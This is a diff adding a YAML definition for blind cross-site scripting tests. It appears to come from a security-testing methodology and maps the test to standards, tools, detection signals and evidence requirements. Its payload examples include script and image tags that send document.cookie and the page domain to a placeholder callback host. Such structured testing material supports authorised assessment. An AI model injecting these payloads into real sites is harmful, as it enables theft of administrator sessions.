@@ -1,0 +1,96 @@
+id: xss-blind
+name: Blind XSS (Asynchronous Execution)
+category: xss
+description: >
+  XSS payload is stored but executed in a context the attacker cannot directly
+  observe. Admin panels, internal dashboards, log viewers, email clients,
+  support ticket systems. Payload fires when an admin or internal user views
+  the infected data. Blind XSS callbacks via webhook listeners (XSS Hunter,
+  Burp Collaborator, interact.sh) are the primary detection method.
+severity: high
+standards:
+  wstg:
+    - WSTG-INPV-02
+  asvs:
+    - "V3.4.3"
+    - "V3.2.2"
+  vrt:
+    - cross_site_scripting_xss.stored
+  cwe:
+    - CWE-79
+applies_to:
+  archetypes:
+    - all
+  surfaces:
+    - admin-panels
+    - support-ticket-forms
+    - application-logs
+    - feedback-forms
+    - crm-systems
+requires:
+  auth: single_account
+  inputs:
+    - list of input forms from katana crawl
+    - webhook or out-of-band callback URL
+  tools:
+    - katana
+    - curl
+    - interact_sh_client
+    - xsshunter
+signals:
+  positive:
+    - Callback received from unexpected internal IP or hostname
+    - Callback from admin or internal subdomain pattern
+    - Callback contains admin cookies tokens or localStorage
+    - Page title or URL received in callback matches dashboard strings
+    - Multiple callbacks over time indicating periodic admin review
+  negative:
+    - No callback after 72 hours (could be time-delayed, extend monitoring)
+    - Callback from own IP or browser (self-reflection, not blind XSS)
+    - Callback from public-facing page everyone sees (stored not blind)
+    - WAF blocking outbound connections from payload
+safety:
+  intrusive: false
+  data_modifying: true
+  rate_limited: false
+  requires_approval: true
+evidence:
+  required:
+    - Callback log from XSS Hunter or interact.sh
+    - Screenshot of received callback details (cookies, DOM, URL)
+    - curl request used to inject the payload
+    - Timestamp correlation of injection vs callback time
+references:
+  urls:
+    - https://portswigger.net/research/the-blind-xss-awakening
+    - https://xsshunter.com/features
+  papers: []
+  writeups:
+    - HackerOne Blind XSS top writeups
+workflow_mapping:
+  skill: xss
+  workflow: W4 (blind XSS)
+payload_families:
+  - name: image_pingback
+    description: img tag with src callback to trigger pingback with page data
+    examples:
+      - '""><img src=https://callback/?data=...'
+      - '<svg/onload=fetch("https://callback/?d="+document.domain)>'
+  - name: script_callback
+    description: Full script tag with exfiltration to callback server
+    examples:
+      - '<script src="https://callback/hook.js"></script>'
+      - '<script>new Image().src="https://callback/?s="+document.cookie</script>'
+  - name: custom_element
+    description: Edge-case payloads for WAF bypass scenarios
+    examples:
+      - '<xss style="behavior:url(#default#time2)" onbegin="fetch(...)">'
+      - '<object data="https://callback/o">'
+tags:
+  - blind
+  - asynchronous
+  - admin-panel
+  - callback
+  - oob
+  - delayed-execution
+  - xsshunter
